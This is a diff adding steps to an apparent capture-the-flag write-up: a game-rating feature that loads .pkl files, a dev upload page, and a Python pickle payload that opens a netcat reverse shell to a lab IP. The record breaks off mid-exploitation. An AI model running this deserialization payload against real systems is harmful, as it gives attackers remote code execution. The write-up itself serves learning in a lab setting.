@@ -27,6 +27,17 @@ The website seems Static and nothing usefull but at bottom i saw this
 
 ![image](https://github.com/user-attachments/assets/3ea0814f-49ef-4e52-8d83-771dcddfeaa5)
 
+When we click on `game rating` button
+
+![image](https://github.com/user-attachments/assets/d7d44968-12a7-42a6-aa07-9b2e1cd1a5d0)
+
+and select any game 
+
+![image](https://github.com/user-attachments/assets/1b31f475-afc9-4d26-a106-3abcccd2cd1d)
+
+it loads a file with a `.pkl` extension.
+ ![image](https://github.com/user-attachments/assets/138eb46d-1938-449d-958e-d5ee8b23166e)
+
 we find a domain name a the bottom of the main page:`admin@incognito.com` There might be subdomain 
 
 Doing a subdomain brute force we find a new domain.
@@ -138,4 +149,50 @@ Target: http://dev.incognito.com/
 
 Task Completed
 ```
-So we found an upload page 
+So we found an upload page `http://dev.incognito.com/secret/upload/`
+
+![image](https://github.com/user-attachments/assets/24f76ccf-fb0d-46cc-921f-2fa45f63dc0f)
+
+Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload.
+
+fire up burpsuite
+As it we saw the game rating button carry a `.pkl` file, after search on web i got this revrse shell: Change the ip before use
+```
+import pickle
+import base64
+import os
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2>&1 | nc 10.17.14.127 1234 > /tmp/f')
+        return os.system, (cmd,)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
+```
+
+Open netcat listner in new terminal
+![image](https://github.com/user-attachments/assets/161c73b3-2eca-4f5f-9fe5-5d4a7cb1c392)
+
+Upload the shell
+![image](https://github.com/user-attachments/assets/d91a451c-c65f-414f-96b5-6048a3bfb896)
+
+![image](https://github.com/user-attachments/assets/871a1900-11b2-4c2c-9448-f4e349f085f2)
+
+Our shell uploded successfully
+![image](https://github.com/user-attachments/assets/67a37349-d2bf-4b32-942d-715b902233dd)
+
+![image](https://github.com/user-attachments/assets/62ea43d1-cfff-40ef-85d5-518d165b7a0a)
+
+Let Execute the shell for doing this back to main website `incognito.com`
+![image](https://github.com/user-attachments/assets/e5a68e02-4fc7-4e3c-b817-8d2a17fa877c)
+
+Let capture the request:
+
+![image](https://github.com/user-attachments/assets/eb37078c-6361-4c2e-9a84-551a524bee5c)
+
+Mod the request
